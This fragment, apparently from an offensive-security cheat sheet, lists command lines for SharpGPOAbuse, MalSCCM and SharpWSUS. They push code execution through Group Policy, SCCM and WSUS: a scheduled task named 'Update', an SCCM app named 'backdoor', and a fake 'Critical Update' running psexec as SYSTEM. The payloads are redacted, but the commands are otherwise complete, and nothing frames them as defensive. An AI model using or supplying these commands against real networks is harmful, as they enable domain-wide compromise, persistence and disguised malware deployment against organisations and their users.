...
# Add immediate task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c [REDACTED_SYSTEM_EXECUTION_PAYLOAD]" --GPOName "Vulnerable GPO"
```
...
MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\[REDACTED_PAYLOAD].exe"
...
SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"[REDACTED_SYSTEM_EXECUTION_PAYLOAD]\"" /title:"Critical Update"
